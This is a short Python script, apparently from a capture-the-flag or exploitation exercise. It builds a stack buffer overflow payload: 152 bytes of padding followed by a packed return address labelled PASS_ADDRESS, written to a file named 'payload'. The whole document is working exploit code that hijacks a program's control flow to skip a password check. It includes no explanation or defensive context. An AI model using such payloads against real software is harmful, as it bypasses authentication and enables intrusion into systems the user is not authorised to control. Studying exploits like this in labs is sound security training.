import struct
BUFFER_SIZE = 144
SAVED_REGISTER_SIZE = 8
PADDING_SIZE = BUFFER_SIZE + SAVED_REGISTER_SIZE
PASS_ADDRESS = 0x104e8
padding = b'.' * PADDING_SIZE
address = struct.pack('<Q', PASS_ADDRESS)
payload = padding + address
with open('payload', 'wb') as f:
    f.write(payload)